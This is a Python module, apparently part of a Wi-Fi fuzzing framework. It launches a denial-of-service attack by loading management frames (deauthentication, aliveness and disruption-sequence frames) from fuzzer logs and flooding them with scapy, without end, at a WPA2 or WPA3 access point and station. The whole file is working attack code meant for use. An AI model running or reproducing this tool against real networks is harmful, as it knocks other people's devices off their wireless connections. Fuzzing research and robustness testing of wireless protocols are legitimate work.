from scapy.all import sendp
from NIC_init import *
from Frame_types.Construct_frame_fields import NUM_OF_FRAMES_TO_SEND, bcolors
from ascii_art import dos_attack, wifi
import os
import codecs
import subprocess


def DoS_attack_init(file_list, mode):
    files_of_mode = []
    chosen_files_list = []
    frames_list = []
    print(dos_attack)
    print(wifi)
    if mode == 1 or mode == 3:
        for file in file_list:
            if 'Aliveness'in file:
                files_of_mode.append(file)
            elif 'Deauth' in file: 
                files_of_mode.append(file)
    elif mode == 2:
        for file in file_list:
            if 'till_disr' in file:
                files_of_mode.append(file)
    else:
        print(bcolors.FAIL + '\nNo relevant files found :(' + bcolors.ENDC)
        os._exit(0)
    print(files_of_mode)
    AP_sec_choice = int(input("Attack choices\n1) WPA3\n2) WPA2\nPick your choice: "))
    if AP_sec_choice == 1:
        for file in files_of_mode:
            if 'WPA3' in file:
                chosen_files_list.append(file)
    elif AP_sec_choice == 2:
        for file in files_of_mode:
            if 'WPA2' in file:
                chosen_files_list.append(file)
    else:
        print(bcolors.FAIL + '\nNo such choice :(' + bcolors.ENDC)
        os._exit(0)
    if not chosen_files_list:
        print("No attack vectors found for the choice you made :(")
        os._exit(0)
    else:
        pass
    for files in chosen_files_list:
        with open(current_dir + "/Logs/fuzz_mngmt_frames/" + files, 'r') as f:
            for line in f:
                if "frame = " in line:
                    temp = line.strip("frame = \nb'")
                    try:
                        frames_list.append(temp.encode().decode('unicode_escape').encode("raw_unicode_escape"))
                    except:
                        pass
    return frames_list
    
    
def send_frames(frames_list, mode):
    counter = 0
    if mode == 1:
        print('\n- - - - - - - - - - - - - - - - - - - - - - - \n')
        print(bcolors.OKGREEN + "Executing the attack...." + bcolors.ENDC)
        print(bcolors.OKGREEN + "Stop the attack with Ctrl+c" + bcolors.ENDC)
        print('\n- - - - - - - - - - - - - - - - - - - - - - - \n')
        while True:
            for frame in frames_list:
                sendp(frame, count=NUM_OF_FRAMES_TO_SEND, iface=att_interface, verbose=0)
    elif mode == 2:
        print('\n- - - - - - - - - - - - - - - - - - - - - - - \n')
        print(bcolors.OKGREEN + "Executing the attack...." + bcolors.ENDC)
        print(bcolors.OKGREEN + "Stop the attack with Ctrl+c" + bcolors.ENDC)
        print('\n- - - - - - - - - - - - - - - - - - - - - - - \n')
        while True:
            for frame in frames_list:
                sendp(frame, count=1, iface=att_interface, verbose=0)
    elif mode == 3:
        try:
            num_of_frames = int(input('\nType the number of frames to send per seed: '))
        except:
            print('\n' + bcolors.FAIL + 'Only integer inputs accepted' + bcolors.ENDC)
            os._exit(0)
        for frame in frames_list:
            print(f'Sending {num_of_frames} frames of the {counter + 1} seed..')
            sendp(frame, count=num_of_frames, iface=att_interface, verbose=0)
            input(bcolors.OKCYAN + 'Press enter to continue to the next seed: ' + bcolors.ENDC)
            counter += 1
        print('\n' + bcolors.FAIL + 'No more seeds found in the log files of the fuzzer' + bcolors.ENDC)
        print('Exiting attack!!')
    else:
        print(bcolors.FAIL + '\nNo such choice :(' + bcolors.ENDC)
        os._exit(0)
    

print(dos_attack)
print('- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - \n\n')
print('\t\tThis module launches a DoS attack based on the data collected from the fuzzing process.\n\t\tIt can only be exploited against the same AP and STA that were used it the fuzzing procedure.\n\t\tFrames that caused any kind of problematic behaviour during the fuzzing are being transmited\n\t\tendlessly during the DoS attack.\n\n')
print('- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - \n\n')
print('1) Frames detected at the moment of connectivity disruption')
print('2) Sequence of frames till the moment of the dirsuption detection')
print('3) Frames detected at the moment of connectivity disruption, one-by-one\n\n')
try:
    choice = int(input('Pick the frames you want to attack with: '))
except:
    print('\n' + bcolors.FAIL + 'Only integer inputs accepted' + bcolors.ENDC)
    os._exit(0)

initiate_NIC()
sleep(3)

current_dir = os.getcwd()
file_list = os.listdir(current_dir + "/Logs/fuzz_mngmt_frames")

subprocess.call(['clear'], shell=True)
send_frames(DoS_attack_init(file_list, choice), choice)
